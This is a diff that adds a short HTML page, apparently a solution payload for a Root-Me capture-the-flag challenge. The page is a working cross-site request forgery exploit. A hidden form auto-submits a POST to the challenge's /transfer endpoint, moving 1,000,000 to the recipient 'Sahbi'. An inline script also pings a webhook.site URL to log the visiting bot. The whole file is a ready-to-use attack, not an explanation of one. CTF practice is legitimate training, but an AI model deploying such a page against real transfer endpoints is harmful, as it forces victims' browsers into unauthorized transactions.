@@ -1,0 +1,11 @@
+<!DOCTYPE html>
+<html><body>
+  <form action="https://instance-01a1ea09-5893-7398-a7a9-a7dfa9571ae2.challenges.root-me.pro/transfer" method="POST" id="csrf">
+    <input type="hidden" name="recipient" value="Sahbi">
+    <input type="hidden" name="amount" value="1000000">
+  </form>
+  <script>
+    new Image().src = "https://webhook.site/065e451c-9dd6-4271-bc11-a4b70b1c4d7f?bot=" + Date.now();
+    setTimeout(function(){ document.getElementById('csrf').submit(); }, 500);
+  </script>
+</body></html>
